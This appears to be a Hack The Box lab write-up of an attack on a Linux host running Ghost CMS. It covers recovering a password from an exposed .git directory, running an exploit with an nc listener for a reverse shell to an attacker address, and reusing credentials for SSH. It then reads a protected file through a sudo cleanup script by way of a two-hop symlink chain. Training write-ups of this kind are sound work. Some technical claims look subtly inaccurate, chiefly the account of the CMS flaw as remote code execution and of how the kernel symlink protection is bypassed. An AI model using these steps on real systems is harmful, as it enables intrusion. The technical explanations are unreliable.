---
title: "Linux Lab — Exposed Git, CMS RCE, and Symlink Protection Bypass"
description: "An exposed .git directory on a development virtual host reveals a CMS password for authenticated RCE; a sudo cleanup script with a user-controlled glob and a two-hop symlink chain bypass kernel symlink protection to read a protected file."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - git
  - ghost-cms
  - symlink
  - sudo
---

## Summary

This Linux lab uses virtual-host enumeration to uncover an exposed `.git` directory on a development subdomain. Git history reveals a CMS password change, granting authenticated access and remote code execution. Privilege escalation abuses a sudo rule that passes a user-controlled glob to a cleanup script, using a two-hop symlink chain to bypass kernel symlink protection and access a protected file.

All target and operator addresses below use role-based placeholders (`<TARGET_IP>`, `<ATTACKER_IP>`). No real credentials, flags, or private paths are included.

## Context and Objective

The engagement targets a single Linux host running Apache with virtual hosting and Ghost CMS. The objective is to obtain initial access through discovered credentials, escalate to user-level access, and ultimately read the root flag by bypassing `fs.protected_symlinks` protection.

## Approach and Evidence

### Port Scanning

Initial reconnaissance identifies open SSH and HTTP services:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/target-tcp
```

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd
```

The web server redirects to `<TARGET_HOSTNAME>`.

### Virtual Host Enumeration

Gobuster vhost enumeration on the base domain reveals a development subdomain:

```bash
gobuster vhost \
  --url http://<TARGET_HOSTNAME> \
  --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  --append-domain
```

```text
<DEVELOPMENT_HOSTNAME>  Status: 200
```

### Git Repository Exposure

Directory enumeration on the development virtual host exposes an unprotected `.git` directory:

```bash
feroxbuster --url http://<DEVELOPMENT_HOSTNAME> --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

```text
http://<DEVELOPMENT_HOSTNAME>/.git
```

The repository is downloaded using `git-dumper` and inspected for staged changes. The diff reveals a modified authentication test file containing a password update:

```diff
-it('complete setup', async function () {
-    const email = 'test@example.com';
-    const password = '<OLD_TEST_PASSWORD>';
+    const password = '<GHOST_ADMIN_PASSWORD>';
```

The source notes report this password grants access to the Ghost CMS admin panel.

### Ghost CMS Authenticated RCE (CVE-2026-29053)

The main site runs Ghost CMS version 5.58.0. The discovered password authenticates to the admin panel. Ghost 5.58.0 is vulnerable to CVE-2026-29053, an authenticated remote code execution flaw triggered by uploading a malicious theme and creating a page with a specific slug.

```bash
python3 exploit.py -i <ATTACKER_IP> -p <PORT>
nc -lvnp <LISTENER_PORT>
```

The exploit uploads the generated theme through the admin panel and triggers execution by visiting the crafted page endpoint, returning a reverse shell.

### Reverse Shell and Credential Harvesting

The reverse shell provides access as the Ghost application user. The Ghost configuration file contains database credentials:

```json
{
  "user": "<DB_USER>",
  "pass": "<DB_PASSWORD>"
}
```

These credentials also authenticate via SSH as `<LOW_PRIVILEGE_USER>`. The source notes confirm the application and SSH passwords are identical.

```bash
sshpass -p '<DB_PASSWORD>' ssh <LOW_PRIVILEGE_USER>@<TARGET_IP>
```

User flag located at `<USER_FLAG_PATH>`.

### Privilege Escalation — Symlink Protection Bypass

The `<LOW_PRIVILEGE_USER>` account has a sudo rule allowing execution of a cleanup script:

```bash
sudo -l
```

```text
User <LOW_PRIVILEGE_USER> may run the following commands on <TARGET_HOSTNAME>:
    (ALL) NOPASSWD: /usr/bin/bash <CLEANUP_SCRIPT> *.png
```

The script accepts a glob argument for PNG files. The `*.png` glob is expanded by the shell before being passed to the script, making it user-controlled.

The system has kernel-level symlink protection enabled:

```bash
sysctl fs.protected_symlinks
```

```text
fs.protected_symlinks = 1
```

With `fs.protected_symlinks=1`, the kernel prevents `open()` from following symlinks in world-writable directories when the symlink owner differs from the follower. A two-step symlink chain bypasses this: create an intermediate symlink pointing at the target file, then create a PNG-named symlink pointing at the intermediate link. The kernel check only inspects the immediate symlink target, not the full chain.

```bash
ln -s <PROTECTED_FILE_PATH> <USER_CACHE>/b
ln -s <USER_CACHE>/b <USER_CACHE>/a.png
```

Verify the chain:

```bash
ls -l <USER_CACHE>/a.png
```

```text
lrwxrwxrwx 1 <USER> <GROUP> <LENGTH> <USER_CACHE>/a.png -> <USER_CACHE>/b
```

Execute the privileged script to trigger the file content read:

```bash
<CONTENT_CHECK_OPTION>=true sudo bash <CLEANUP_SCRIPT> <USER_CACHE>/a.png
```

The script outputs the contents of the root flag through the symlink chain.

## Challenges and Decisions

- The Ghost CMS password was found in a Git diff rather than an obvious config file, requiring careful staging-area inspection.
- `fs.protected_symlinks=1` blocks direct symlinks from world-writable directories; the two-hop indirection bypasses the check because the immediate target of the `.png` symlink is in the same directory and owned by the same user.

## Outcome

Full compromise achieved: initial access via Ghost CMS credentials extracted from exposed Git history, authenticated RCE through CVE-2026-29053, lateral movement to SSH using reused credentials, and root flag extraction through a symlink chain bypassing kernel protection.

## Lessons and Recommendations

- Exposed `.git` directories on development hosts are high-value enumeration targets. Git history reveals credentials even after they are removed from tracked files.
- Application credentials often mirror system user passwords. Ghost CMS database credentials in configuration files double as SSH credentials.
- `fs.protected_symlinks=1` is not complete protection. A two-hop symlink chain defeats it because the kernel check only inspects the immediate symlink target, not the resolved chain.
- Sudo rules combining user-controlled globs with privileged file operations are inherently dangerous. The `*.png` argument expands in the shell before `sudo` processes it.

## References

- HTB machine: retired Linux lab — [LinkVortex](https://app.hackthebox.com/machines/LinkVortex)
- Ghost CMS: CVE-2026-29053 authenticated RCE
- Linux kernel: `fs.protected_symlinks` sysctl documentation
